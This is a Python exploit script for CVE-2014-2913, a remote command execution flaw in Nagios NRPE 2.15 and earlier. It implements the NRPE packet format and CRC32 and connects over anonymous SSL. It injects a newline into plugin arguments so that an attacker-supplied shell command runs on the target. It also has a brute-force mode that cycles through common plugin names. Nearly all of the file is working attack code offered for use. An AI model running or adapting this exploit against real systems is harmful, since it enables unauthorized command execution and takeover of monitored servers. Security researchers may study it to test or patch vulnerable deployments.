#!/usr/bin/python
#
#
# Exploit Title : NRPE <= 2.15 Remote Code Execution Vulnerability
#
# Discovered by  : Dawid Golunski
#                  dawid (at) legalhackers (dot) com
#                  legalhackers.com
#
# Exploit Author : Claudio Viviani
#                  http://www.homelab.it
#
#                  info@homelab.it
#                  homelabit@protonmail.ch
#
#                  https://www.facebook.com/homelabit
#                  https://twitter.com/homelabit
#                  https://plus.google.com/+HomelabIt1/
#                  https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
#
#
#
# C crc32 function ripped from check_nrpe_clone by Alan Brenner <alan.brenner@ithaka.org>
#                                       http://www.abcompcons.com/files/nrpe_client.py
#
# pyOpenSSL Library required (http://pyopenssl.sourceforge.net/)
#
# [root@localhost ~]# pip-python install pyOpenSSL
#
# NRPE <= 2.15 Remote Command Execution Vulnerability
# Release date: 17.04.2014
# Discovered by: Dawid Golunski
# Severity: High
# CVE-2014-2913
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2913
# http://www.exploit-db.com/exploits/32925/
# http://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/ (ITA)
#
# Tested on CentOS 5.x, CentOS 6.x, BacBox 3.x, KaliLinux 1.0.6 with Python 2.x
#
# Demo: https://www.youtube.com/watch?v=nmYiBdnWWcE
#

import OpenSSL # non-standard, see http://pyopenssl.sourceforge.net/
import optparse
import os
import signal
import socket
import struct
import sys
import time

banner = """

$$\   $$\ $$$$$$$\  $$$$$$$\  $$$$$$$$\        $$$$$$\        $$\  $$$$$$$\\
$$$\  $$ |$$  __$$\ $$  __$$\ $$  _____|      $$  __$$\     $$$$ | $$  ____|
$$$$\ $$ |$$ |  $$ |$$ |  $$ |$$ |            \__/  $$ |    \_$$ | $$ |
$$ $$\$$ |$$$$$$$  |$$$$$$$  |$$$$$\           $$$$$$  |      $$ | $$$$$$$\\
$$ \$$$$ |$$  __$$< $$  ____/ $$  __|         $$  ____/       $$ | \_____$$\\
$$ |\$$$ |$$ |  $$ |$$ |      $$ |            $$ |            $$ | $$\   $$ |
$$ | \$$ |$$ |  $$ |$$ |      $$$$$$$$\       $$$$$$$$\ $$\ $$$$$$\\$$$$$$  |
\__|  \__|\__|  \__|\__|      \________|      \________|\__|\______|\______/



                  $$$$$$$\   $$$$$$\  $$$$$$$$\\
                  $$  __$$\ $$  __$$\ $$  _____|
                  $$ |  $$ |$$ /  \__|$$ |
                  $$$$$$$  |$$ |      $$$$$\\
                  $$  __$$< $$ |      $$  __|
                  $$ |  $$ |$$ |  $$\ $$ |
                  $$ |  $$ |\$$$$$$  |$$$$$$$$\\
                  \__|  \__| \______/ \________|
                                                   NRPE <= 2.15 R3m0t3 C0mm4nd Ex3cut10n


                =============================================
                - Release date: 17.04.2014
                - Discovered by: Dawid Golunski
                - Severity: High
                - CVE: 2014-2913
                =============================================

                                Written by:

                              Claudio Viviani

                           http://www.homelab.it

                              info@homelab.it
                           homelabit@protonmail.ch

                      https://www.facebook.com/homelabit
                      https://twitter.com/homelabit
                      https://plus.google.com/+HomelabIt1/
            https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

"""
# Plugin list for Brute force mode
PluginList = ['check_all',
             'check_apt',
             'check_bdii',
             'check_bonding',
             'check_breeze',
             'check_by_ssh',
             'check_check-updates',
             'check_check_sip',
             'check_cluster',
             'check_dhcp',
             'check_dig',
             'check_disk',
             'check_disk_smb',
             'check_dns',
             'check_dpm-disk',
             'check_dpm-head',
             'check_dummy',
             'check_file_age',
             'check_flexlm',
             'check_fping',
             'check_game',
             'check_hpjd',
             'check_http',
             'check_icmp',
             'check_ide_smart',
             'check_ifoperstatus',
             'check_ifstatus',
             'check_ircd',
             'check_lcgdm',
             'check_lcgdm-common',
             'check_ldap',
             'check_lfc',
             'check_linux_raid',
             'check_load',
             'check_log',
             'check_mailq',
             'check_mrtg',
             'check_mrtgtraf',
             'check_mysql',
             'check_nagios',
             'check_nrpe',
             'check_nt',
             'check_ntp',
             'check_nwstat',
             'check_openmanage',
             'check_oracle',
             'check_overcr',
             'check_perl',
             'check_pgsql',
             'check_ping',
             'check_procs',
             'check_radius',
             'check_real',
             'check_rhev',
             'check_rpc',
             'check_sensors',
             'check_smtp',
             'check_snmp',
             'check_ssh',
             'check_swap',
             'check_tcp',
             'check_time',
             'check_ups',
             'check_users',
             'check_wave']



# nrpe 2.15 skip chars "|`&><'\"\\[]{};" and "$()" but not "\x0a"(new line)
evilchar = "\x0a"

QUERY_PACKET    = 1
RESPONSE_PACKET = 2

NRPE_PACKET_VERSION_2 = 2

# max amount of data we'll send in one query/response
MAX_PACKETBUFFER_LENGTH = 1024


#def debug(sMessage):
#    """Send a string to STDERR"""
#    if DEBUG:
#        sys.stderr.write("%s\n" % sMessage)

class DataPacket:
    """A Python implementation of the C struct, packet."""
    def __init__(self, packet_version, packet_type):
        self.nPacketVersion = packet_version # int16
        self.nPacketType = packet_type # int16
        self.nCRC32 = 0 # u_int32
        self.nResultCode = 2324 # int16
        self.sData = ''
        self.tCRC32 = (
             0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419,
             0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4,
             0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07,
             0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
             0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856,
             0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
             0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4,
             0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
             0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3,
             0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a,
             0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599,
             0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
             0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190,
             0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f,
             0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e,
             0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
             0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed,
             0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
             0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3,
             0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
             0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a,
             0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5,
             0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010,
             0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
             0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17,
             0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6,
             0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615,
             0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
             0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344,
             0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
             0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a,
             0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
             0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1,
             0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c,
             0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef,
             0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
             0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe,
             0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31,
             0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c,
             0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
             0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b,
             0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
             0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1,
             0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,
             0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278,
             0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7,
             0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66,
             0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
             0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605,
             0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8,
             0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b,
             0x2d02ef8d)

    def __str__(self):
        # Turn whatever string data we have into a null terminated string
        if len(self.sData) < MAX_PACKETBUFFER_LENGTH:
            sData = self.sData + "\0" * (MAX_PACKETBUFFER_LENGTH - len(self.sData))
            sData += "SR" # not sure about this, from perl
        elif len(self.sData) == MAX_PACKETBUFFER_LENGTH + 2:
            sData = self.sData
        else:
            raise ValueError("CHECK_NRPE: invalid input")
        # Return a string that equals the C struct, not something printable
        return struct.pack("!hhLh" + str(len(sData)) + "s", self.nPacketVersion,
            self.nPacketType, self.nCRC32, self.nResultCode, sData)

    def __len__(self):
        return len(self.__str__())

    def dumpself(self):
        """Debugging output for self as C structure.

        Not normally used."""
        sElf = self.__str__()
        sPrev = sElf[0:1]
        nCount = 0
        ii = -1
        for sChar in sElf[1:]:
            ii += 1
            if sChar == sPrev:
                nCount += 1
                continue
            if nCount:
                print "%d\t%d *" % (ii - nCount, nCount + 1),
                nCount = 0
            else:
                print "%d\t" % ii,
            print "\t'%s' (%d)" % (sPrev, ord(sPrev))
            sPrev = sChar
        print "%d\t\t'%s' (%d)" % (ii + 1, sPrev, ord(sPrev))

    def calculate_crc32(self):
        """Calculate the CRC32 value for the string version of self."""
        nCRC = 0xFFFFFFFF
        for ii in self.__str__():
            nIndex = (nCRC ^ ord(ii)) & 0xFF
            nCRC = ((nCRC >> 8) & 0x00FFFFFF) ^ self.tCRC32[nIndex]
        self.nCRC32 = nCRC ^ 0xFFFFFFFF
        #debug("DataPacket.calculate_crc32 = %d" % self.nCRC32)

    def extract(self, sQuery):
        """Turn a string into the DataPacket attributes."""
        #debug("DataPacket.extract(%d)" % len(sQuery))
        tVals = struct.unpack("!hhLh" + str(len(sQuery) - 10) + "s", sQuery)
        self.nPacketVersion = tVals[0]
        self.nPacketType = tVals[1]
        self.nCRC32 = tVals[2]
        self.nResultCode = tVals[3]
        self.sData = tVals[4]

m_nTimeout = 0
def alarm_handler(nSignum, oFrame):
    """Timeout catcher"""
    raise KeyboardInterrupt("CHECK_NRPE: Socket timeout after %d seconds." %
        m_nTimeout)


class NrpeClient(DataPacket):
    """Everything needed to send a message to an NRPE server and get data back.
    """
    def __init__(self, server_name, server_port=5666, use_ssl=True, timeout=10,
                 packet_version=NRPE_PACKET_VERSION_2):
        DataPacket.__init__(self, packet_version, QUERY_PACKET)
        self.sServer = server_name
        self.nPort = server_port
        self.bUseSSL = use_ssl
        self.nTimeout = timeout

    def run_query(self, sQuery):
        """Connect to the NRPE server, send the query and get back data.
        """
        # initialize alarm signal handling and set timeout
        signal.signal(signal.SIGALRM, alarm_handler)
        signal.alarm(self.nTimeout)

        # try to connect to the host at the given port number
        oSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # do SSL handshake
        if self.bUseSSL:
            oContext = OpenSSL.SSL.Context(OpenSSL.SSL.TLSv1_METHOD)
            oContext.set_cipher_list('ADH')
            oConnection = OpenSSL.SSL.Connection(oContext, oSocket)
        else:
            oConnection = oSocket

        oConnection.connect((self.sServer, self.nPort))

        # we're connected and ready to go
        self.sData = sQuery
        self.nCRC32 = 0
        self.calculate_crc32()

        # send the packet
        oConnection.send(str(self))

        # wait for the response packet
        sRval = oConnection.recv(len(self))

        # close the connection
        if self.bUseSSL and not oConnection.shutdown():
            try:
                sRval += oConnection.recv(len(self))
            except OpenSSL.SSL.ZeroReturnError:
                pass
        oSocket.close()
        del oSocket, oConnection
        if self.bUseSSL:
            del oContext

        # reset timeout
        signal.alarm(0)

        if len(sRval) == 0:
            raise IOError("CHECK_NRPE: Received 0 bytes from daemon." +
                "Check the remote server logs for error messages.")
        elif len(sRval) < len(self):
            raise IOError("CHECK_NRPE: Receive underflow - only " +
                "%d bytes received (%d expected)." % (len(sRval), len(self)))

        # Become the received data
        self.extract(sRval)

        # check the crc 32 value
        nRvalCRC = self.nCRC32
        self.nCRC32 = 0
        self.calculate_crc32()
        if nRvalCRC != self.nCRC32:
            raise ValueError("CHECK_NRPE: Response packet had invalid CRC32.")

        # check packet version
        if self.nPacketVersion != NRPE_PACKET_VERSION_2:
            raise ValueError("CHECK_NRPE: Invalid packet version received from server.")

        # check packet type
        if self.nPacketType != RESPONSE_PACKET:
            raise ValueError("CHECK_NRPE: Invalid packet type received from server.")

        # Turn the input data into a proper python string (chop at first NULL)
        for ii in range(len(self.sData)):
            if self.sData[ii] == "\0":
                break
        self.sData = self.sData[0:ii]


if __name__ == '__main__':
    m_oOpts = optparse.OptionParser("%prog -H Host_or_IP -c nrpe_command --cmd=\"command to execute\" [-b, --brute] [-n] [-p PORT] [--timeout sec] [--list]")
    m_oOpts.add_option('--host', '-H', action='store', type='string',
        help='The address of the host running the NRPE daemon (required)')
    m_oOpts.add_option('--ssl', '-n', action='store_false', default=True,
        help='Do no use SSL')
    m_oOpts.add_option('--port', '-p', action='store', type='int', default=5666,
        help='The port on which the daemon is running (default=5666)')
    m_oOpts.add_option('--timeout', '-t', action='store', type='int',
        default=10,
        help='Number of seconds before connection times out (default=10)')
    m_oOpts.add_option('--command', '-c', action='store', type='string',
        #default='get_data',
        help='The name of nrpe command')
    m_oOpts.add_option('--brute', '-b', action='store_true', default=False,
        help='Find existing nrpe command from list [ -list ]')
    m_oOpts.add_option('--list', action='store_true',  default=False,
        help='Show NRPE Command list')
    m_oOpts.add_option('--cmd', action='store', type='string',
        help='Command to execute on the remote server')

    m_oOptions, m_lArgs = m_oOpts.parse_args()
    m_nTimeout = m_oOptions.timeout
    m_sQuery = m_oOptions.command
    m_gList = m_oOptions.list
    m_sBrute = m_oOptions.brute

    print (banner)

    if m_gList:
        print('[+] NRPE Command list\n')
        for LinesPluginList in PluginList:
            print(LinesPluginList)
        sys.exit(0)
    elif m_sQuery and m_sBrute:
        print m_oOpts.format_help()
        print('[!]')
        print('[!] ERROR: Select only -c OR -b option\n')
        sys.exit(0)
    elif not m_oOptions.host or not m_oOptions.cmd:
        print m_oOpts.format_help()
        sys.exit(0)

    print('[+] Target: '+m_oOptions.host)
    print('[+] Command: '+m_oOptions.cmd+' \n')

    if m_sBrute:
        print('[+] Brute force Mode....')
        print('[+]')
        for LinesPluginList in PluginList:

                m_CommandQuery = ""
                m_CommandQuery += ' ' + m_oOptions.cmd
                if m_lArgs:
                        m_CommandQuery += ' ' + ' '.join(m_lArgs)

                m_sQuery = LinesPluginList+'!'+str(evilchar)+str(m_CommandQuery)+' #'


                m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,
                        m_oOptions.timeout)
                try:
                        m_oNRPE.run_query(m_sQuery)
                except socket.error:
                        print('[!] Connection Error!')
                        sys.exit(1)
                except OpenSSL.SSL.ZeroReturnError:
                        print('[!] Not Vulnerable')
                        print('[!] Option dont_blame_nrpe disabled or service fixed')
                        sys.exit(1)

                if m_oNRPE.sData[-11:] == "not defined":
                        print('[-] Checking for NRPE command '+LinesPluginList+':\t\t\tnot found')
                else:
                        print('[+] Checking for NRPE command '+LinesPluginList+':\t\t\tVULNERABLE!')
                        print('[+]')
                        print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')
                        print('[+]')
                        print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')
                        print('[+]')
                        print(m_oNRPE.sData)
                        sys.exit(0)
    elif m_sQuery:
        print('[+] Custom command Mode....')
        print('[+]')
        print('[+] Connecting......')

        m_CommandQuery = ""
        m_CommandQuery += ' ' + m_oOptions.cmd
        if m_lArgs:
                m_CommandQuery += ' ' + ' '.join(m_lArgs)

        m_sQuery = m_sQuery+'!'+str(evilchar)+str(m_CommandQuery)+' #'

        m_oNRPE = NrpeClient(m_oOptions.host, m_oOptions.port, m_oOptions.ssl,
                m_oOptions.timeout)
        try:
               m_oNRPE.run_query(m_sQuery)
        except KeyboardInterrupt:
                print("[!] CHECK_NRPE: Socket timeout after %d seconds." % m_nTimeout)
                sys.exit(1)
        except socket.error:
                print('[!] Connection Error!')
                sys.exit(1)
        except OpenSSL.SSL.ZeroReturnError:
                print('[!] Not Vulnerable')
                print('[!] Option dont_blame_nrpe disabled or service fixed')
                sys.exit(1)

        if m_oNRPE.sData[-11:] == "not defined":
                print('[-] Checking for NRPE command '+m_oOptions.command+': not found...try other NRPE command')
        else:
                print('[+] Checking for NRPE command '+m_oOptions.command+': VULNERABLE!')
                print('[+]')
                print('[+] Max Output CHAR 1024 (According to NRPE <= 2.15 specifications)')
                print('[+]')
                print('[+] Please ignore NRPE plugin command messages (Usage or Errors)')
                print('[+]')
                print(m_oNRPE.sData)
                sys.exit(0)

